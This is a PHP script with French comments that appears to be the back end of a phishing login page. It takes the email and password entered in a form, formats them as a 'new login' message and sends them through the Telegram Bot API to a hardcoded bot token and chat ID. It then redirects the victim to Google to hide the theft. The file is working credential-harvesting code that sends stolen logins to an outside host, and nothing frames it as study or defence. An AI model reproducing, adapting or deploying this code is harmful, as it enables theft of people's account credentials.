<?php
// Remplacez 'YOUR_BOT_API_KEY' par l'API key de votre bot Telegram
$botToken = "6070285787:AAEfD4_-25DQg3GMcsA5Gb6VfbXp0w_bERk";
// Remplacez 'YOUR_CHAT_ID' par votre chat ID Telegram
$chatId = "5542861728";

// Récupération des données du formulaire
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Création du message à envoyer
$message = "Nouvelle connexion :\nEmail : $email\nMot de passe : $password";

// URL pour envoyer le message via l'API Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Les données à envoyer via POST
$postData = [
    'chat_id' => $chatId,
    'text' => $message,
];

// Utilisation de cURL pour envoyer la requête POST
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
$response = curl_exec($ch);
curl_close($ch);

// Redirection vers Google après soumission du formulaire
header('Location: https://www.google.com');
exit();
?>
